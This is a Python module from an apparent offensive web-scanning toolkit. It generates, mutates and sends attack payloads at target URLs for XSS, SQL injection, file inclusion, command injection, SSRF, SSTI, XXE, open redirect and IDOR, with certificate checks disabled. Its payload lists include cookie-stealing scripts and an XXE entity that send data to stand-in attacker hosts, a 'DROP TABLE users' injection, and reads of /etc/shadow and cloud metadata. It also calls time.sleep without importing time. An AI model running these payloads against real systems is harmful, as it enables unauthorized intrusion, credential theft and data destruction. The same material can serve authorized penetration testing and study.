
#!/usr/bin/env python3
"""
Enhanced Automated Payload Generator & Tester: Auto-builds and tests mutated payloads on endpoints.
"""
import os
import re
import json
import random
import hashlib
import requests
import concurrent.futures
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore, Style
from tqdm import tqdm
from .utils import print_colored, save_to_file

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class PayloadGenerator:
    """Class for automated payload generation and testing"""
    
    def __init__(self, endpoints, wordlist, output_dir, max_workers=5):
        self.endpoints = endpoints
        self.wordlist = wordlist or []
        self.output_dir = output_dir
        self.max_workers = max_workers
        self.results = []
        
        # Create output directory
        self.payload_dir = os.path.join(output_dir, "payloads")
        if not os.path.exists(self.payload_dir):
            os.makedirs(self.payload_dir)
        
        # Custom headers for requests
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5"
        }
        
        # Initialize payload categories
        self.initialize_payloads()
    
    def initialize_payloads(self):
        """Initialize different payload categories"""
        self.payloads = {
            "xss": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "javascript:alert(1)",
                "';alert(1);//",
                "\"><script>alert(1)</script>",
                "<script>fetch('https://attacker.com/'+document.cookie)</script>",
                "<img src=x onerror=fetch('https://attacker.com/'+document.cookie)>",
                "<div onmouseover=\"alert(1)\">hover me</div>",
                "<iframe src=\"javascript:alert(1)\"></iframe>"
            ],
            
            "sqli": [
                "' OR 1=1--",
                "\" OR 1=1--",
                "1' OR '1'='1",
                "1\" OR \"1\"=\"1",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT username,password,3 FROM users--",
                "admin'--",
                "1'; DROP TABLE users--",
                "' OR '1'='1' -- /*",
                "\" OR 1=1 LIMIT 1--"
            ],
            
            "lfi": [
                "../../../etc/passwd",
                "../../../../etc/passwd",
                "..%2f..%2f..%2fetc%2fpasswd",
                "/etc/passwd",
                "....//....//....//etc/passwd",
                "../../../../../../../../../../../../../../etc/passwd",
                "../../../../../../../../etc/shadow",
                "/proc/self/environ",
                "/var/log/apache2/access.log",
                "php://filter/convert.base64-encode/resource=index.php"
            ],
            
            "rce": [
                "$(sleep 5)",
                "; sleep 5;",
                "| sleep 5",
                "`sleep 5`",
                "|| sleep 5 ||",
                "& ping -c 5 127.0.0.1 &",
                "'; ping -c 5 127.0.0.1;'",
                "system('id')",
                "<?php system('id'); ?>",
                "; cat /etc/passwd"
            ],
            
            "ssrf": [
                "http://localhost/",
                "http://127.0.0.1/",
                "http://[::1]/",
                "http://localhost:22/",
                "http://localhost:3306/",
                "http://169.254.169.254/latest/meta-data/",
                "file:///etc/passwd",
                "http://internal-service/",
                "dict://internal:11211/",
                "gopher://localhost:25/xHELO%20localhost"
            ],
            
            "ssti": [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "#{7*7}",
                "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "{{''.__class__.mro()[1].__subclasses__()[40]('id').read()}}",
                "{{config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                "{{''.____class____.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}"
            ],
            
            "xxe": [
                "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>",
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
                "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/passwd\">]><data>&file;</data>",
                "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"http://127.0.0.1:80\">]><data>&file;</data>",
                "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % param1 \"file:///etc/passwd\"><!ENTITY % param2 \"http://attackerserver.com/?%param1;\">%param2;]><data>test</data>"
            ],
            
            "open_redirect": [
                "https://evil.com",
                "//evil.com",
                "/\\evil.com",
                "https:evil.com",
                "javascript:alert(1)",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
                "\\.evil.com",
                "evil%E3%80%82com",
                "%09//evil.com",
                "/%2f/evil.com"
            ],
            
            "idor": [
                "1",
                "2",
                "0",
                "-1",
                "9999999",
                "admin",
                "../../admin/profile",
                "../../../etc/passwd",
                "12345678",
                "00000001",
                "6c3e226b-a34a-4763-9f1f-814516f58a8d",
                "ACEF7869BDC94E13A8E97AF93BB2CFE5"
            ]
        }
        
        # Special mutation functions to generate additional payloads
        self.mutations = {
            "case_variations": lambda p: p.upper() if p.islower() else p.lower(),
            "url_encoding": lambda p: requests.utils.quote(p, safe=''),
            "double_encoding": lambda p: requests.utils.quote(requests.utils.quote(p, safe=''), safe=''),
            "add_nullbyte": lambda p: p + "%00",
            "add_comment": lambda p: p + "<!---->",
            "json_wrap": lambda p: json.dumps({"payload": p})[1:-1],
            "reverse": lambda p: p[::-1],
            "space_to_plus": lambda p: p.replace(" ", "+"),
            "repeat": lambda p: p + p
        }
    
    def filter_endpoints_with_params(self):
        """Filter endpoints that have query parameters"""
        return [ep for ep in self.endpoints if "?" in ep and "=" in ep]
    
    def get_random_params(self, count=3):
        """Get random parameters from the wordlist"""
        if not self.wordlist:
            return ["id", "user", "page"]
            
        if len(self.wordlist) <= count:
            return self.wordlist
            
        return random.sample(self.wordlist, count)
    
    def mutate_payload(self, payload_type, original_payload):
        """Apply mutations to a payload to generate variations"""
        # Select two random mutations
        selected_mutations = random.sample(list(self.mutations.values()), min(2, len(self.mutations)))
        
        # Apply mutations
        mutated = original_payload
        for mutation in selected_mutations:
            try:
                mutated = mutation(mutated)
            except:
                continue
                
        return mutated
    
    def inject_payload_to_params(self, url, payload):
        """Inject a payload into URL parameters"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            # If no params, add a test parameter
            return f"{url}{'&' if '?' in url else '?'}test={payload}"
        
        # Pick a random parameter to inject into
        param = random.choice(list(params.keys()))
        params[param] = [payload]
        
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))
    
    def add_payload_to_url(self, url, payload):
        """Add a payload as a new parameter to a URL"""
        param_name = random.choice(self.get_random_params(1))
        connector = "&" if "?" in url else "?"
        return f"{url}{connector}{param_name}={payload}"
    
    def analyze_response(self, url, payload, payload_type, response):
        """Analyze response for signs of vulnerability"""
        if response is None:
            return None
            
        # Different detection patterns based on payload type
        if payload_type == "xss":
            # Check if payload is reflected in response
            if payload in response.text:
                return {
                    "url": url,
                    "payload": payload,
                    "type": payload_type,
                    "evidence": "Payload reflected in response",
                    "status_code": response.status_code,
                    "risk": "High"
                }
                
        elif payload_type == "sqli":
            # Check for SQL error messages
            sql_errors = [
                "SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL", "SQLite3", 
                "syntax error", "unclosed quotation", "not a valid MySQL", 
                "native exception", "ODBC Driver", "error in your SQL syntax",
                "Microsoft OLE DB Provider for SQL Server", "Unclosed quotation mark",
                "PostgreSQL query failed", "supplied argument is not a valid MySQL"
            ]
            for error in sql_errors:
                if error in response.text:
                    return {
                        "url": url,
                        "payload": payload,
                        "type": payload_type,
                        "evidence": f"SQL error detected: {error}",
                        "status_code": response.status_code,
                        "risk": "Critical"
                    }
                    
        elif payload_type == "lfi":
            # Check for file content indicators
            file_indicators = ["root:", "daemon:", "bin:", "sys:", "sync:", "games:", "man:", "lp:", "mail:"]
            for indicator in file_indicators:
                if indicator in response.text:
                    return {
                        "url": url,
                        "payload": payload,
                        "type": payload_type,
                        "evidence": f"File content detected: {indicator}",
                        "status_code": response.status_code,
                        "risk": "Critical"
                    }
                    
        elif payload_type == "rce":
            # Check for command execution indicators - here we only check timeout
            if response.elapsed.total_seconds() >= 4.5:  # For sleep commands
                return {
                    "url": url,
                    "payload": payload,
                    "type": payload_type,
                    "evidence": f"Timeout detected ({response.elapsed.total_seconds()} seconds)",
                    "status_code": response.status_code,
                    "risk": "Critical"
                }
                
        elif payload_type == "ssrf":
            # SSRF is hard to detect automatically - check for unusual content length or timeout
            if response.elapsed.total_seconds() >= 3.0:
                return {
                    "url": url,
                    "payload": payload,
                    "type": payload_type,
                    "evidence": "Timeout may indicate SSRF",
                    "status_code": response.status_code,
                    "risk": "Medium"
                }
                
        elif payload_type == "ssti":
            # For templating injection like {{7*7}}
            if "49" in response.text and "{{7*7}}" in payload:
                return {
                    "url": url,
                    "payload": payload,
                    "type": payload_type,
                    "evidence": "Template expression evaluated (7*7=49)",
                    "status_code": response.status_code,
                    "risk": "High"
                }
                
        elif payload_type == "xxe":
            # XXE detection
            if any(indicator in response.text for indicator in ["root:", "daemon:", "<!ENTITY"]):
                return {
                    "url": url,
                    "payload": payload,
                    "type": payload_type,
                    "evidence": "Possible XXE content found",
                    "status_code": response.status_code,
                    "risk": "Critical"
                }
                
        elif payload_type == "open_redirect":
            # Open redirect detection
            if response.status_code in [301, 302, 303, 307, 308]:
                location = response.headers.get("Location", "")
                if "evil.com" in location:
                    return {
                        "url": url,
                        "payload": payload,
                        "type": payload_type,
                        "evidence": f"Redirect to evil.com: {location}",
                        "status_code": response.status_code,
                        "risk": "High"
                    }
                    
        elif payload_type == "idor":
            # IDOR detection (simple heuristic based on response size change)
            if payload in ["1", "2", "admin"] and len(response.text) > 100:
                return {
                    "url": url,
                    "payload": payload,
                    "type": payload_type,
                    "evidence": "Possible IDOR - response contains data",
                    "status_code": response.status_code,
                    "risk": "Medium"
                }
        
        # Generic error-based detection
        error_patterns = [
            "fatal error", "exception", "stack trace", "syntax error",
            "undefined index", "unexpected", "warning:", "error:",
            "uncaught exception", "debug", "mysqli_error", "traceback",
            "undefined variable", "internal server error", "unable to connect"
        ]
        
        for pattern in error_patterns:
            if pattern in response.text.lower():
                return {
                    "url": url,
                    "payload": payload,
                    "type": payload_type,
                    "evidence": f"Error detected: {pattern}",
                    "status_code": response.status_code,
                    "risk": "Medium"
                }
        
        return None
    
    def test_payload(self, url, payload_type):
        """Test a specific payload type against a URL"""
        results = []
        
        # Get payloads for the specified type
        payloads = self.payloads.get(payload_type, [])
        if not payloads:
            return results
            
        # Select a subset of payloads to test
        selected_payloads = random.sample(payloads, min(3, len(payloads)))
        
        for original_payload in selected_payloads:
            # Also test a mutated version
            mutated_payload = self.mutate_payload(payload_type, original_payload)
            
            for payload in [original_payload, mutated_payload]:
                # Try injecting into existing parameters
                if "?" in url and "=" in url:
                    injected_url = self.inject_payload_to_params(url, payload)
                else:
                    # Add as a new parameter
                    injected_url = self.add_payload_to_url(url, payload)
                
                try:
                    response = requests.get(
                        injected_url, 
                        headers=self.headers, 
                        timeout=8, 
                        verify=False,
                        allow_redirects=False
                    )
                    
                    result = self.analyze_response(injected_url, payload, payload_type, response)
                    if result:
                        results.append(result)
                except Exception as e:
                    # For some payloads like RCE, a timeout could be a sign of success
                    if payload_type == "rce" and "timeout" in str(e).lower():
                        results.append({
                            "url": injected_url,
                            "payload": payload,
                            "type": payload_type,
                            "evidence": "Request timed out - possible command execution",
                            "status_code": 0,
                            "risk": "High"
                        })
        
        return results
    
    def test_all_payloads(self):
        """Test all payload types against the provided endpoints"""
        print_colored("[*] Generating & testing automated payloads for endpoints...", Fore.YELLOW)
        
        # Get random subset of endpoints to test
        max_endpoints = 30
        if len(self.endpoints) > max_endpoints:
            test_endpoints = random.sample(self.endpoints, max_endpoints)
        else:
            test_endpoints = self.endpoints
        
        all_results = []
        
        with tqdm(total=len(test_endpoints) * len(self.payloads), desc="Testing payloads") as pbar:
            for url in test_endpoints:
                for payload_type in self.payloads:
                    results = self.test_payload(url, payload_type)
                    all_results.extend(results)
                    pbar.update(1)
                    
                    # If we've found a vulnerability, slow down to avoid flooding
                    if results:
                        time.sleep(0.5)
        
        print_colored(f"[+] Payload testing complete. Found {len(all_results)} potential issues.", Fore.GREEN)
        
        return all_results
    
    def save_results(self, results):
        """Save test results to files"""
        if not results:
            print_colored("[*] No potential vulnerabilities found during payload testing.", Fore.YELLOW)
            return
            
        # Sort results by risk level
        risk_order = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3}
        sorted_results = sorted(results, key=lambda x: risk_order.get(x.get("risk", "Low"), 4))
        
        # Create general results output
        results_file = os.path.join(self.payload_dir, "payload_results.txt")
        result_lines = []
        
        for result in sorted_results:
            url = result.get("url", "unknown")
            payload_type = result.get("type", "unknown")
            risk = result.get("risk", "Low")
            evidence = result.get("evidence", "No evidence")
            
            line = f"[{risk.upper()}] {payload_type}: {url}\n  Evidence: {evidence}\n"
            result_lines.append(line)
            
            # Print critical and high findings to console
            if risk in ["Critical", "High"]:
                color = Fore.RED if risk == "Critical" else Fore.MAGENTA
                print_colored(line, color)
        
        save_to_file(result_lines, results_file)
        
        # Create JSON output for detailed analysis
        json_file = os.path.join(self.payload_dir, "payload_results.json")
        with open(json_file, 'w') as f:
            json.dump({
                "total_findings": len(results),
                "by_risk": {
                    "critical": len([r for r in results if r.get("risk") == "Critical"]),
                    "high": len([r for r in results if r.get("risk") == "High"]),
                    "medium": len([r for r in results if r.get("risk") == "Medium"]),
                    "low": len([r for r in results if r.get("risk") == "Low"])
                },
                "findings": results
            }, f, indent=2)
        
        # Create separate files by vulnerability type
        vuln_types = {}
        for result in results:
            vuln_type = result.get("type", "unknown")
            if vuln_type not in vuln_types:
                vuln_types[vuln_type] = []
            vuln_types[vuln_type].append(result)
        
        for vuln_type, findings in vuln_types.items():
            type_file = os.path.join(self.payload_dir, f"{vuln_type}_findings.txt")
            type_lines = [f"[{r.get('risk', 'Low').upper()}] {r.get('url', 'unknown')}\n  Payload: {r.get('payload', 'unknown')}\n  Evidence: {r.get('evidence', 'No evidence')}\n" for r in findings]
            save_to_file(type_lines, type_file)
        
        print_colored(f"[+] Saved detailed results to {json_file}", Fore.GREEN)
        print_colored(f"[+] Summary: {len([r for r in results if r.get('risk') == 'Critical'])} Critical, {len([r for r in results if r.get('risk') == 'High'])} High, {len([r for r in results if r.get('risk') == 'Medium'])} Medium risk findings", Fore.YELLOW)

def generate_and_test_payloads(endpoints, wordlist, output_dir):
    generator = PayloadGenerator(endpoints, wordlist, output_dir)
    results = generator.test_all_payloads()
    generator.save_results(results)
    return results
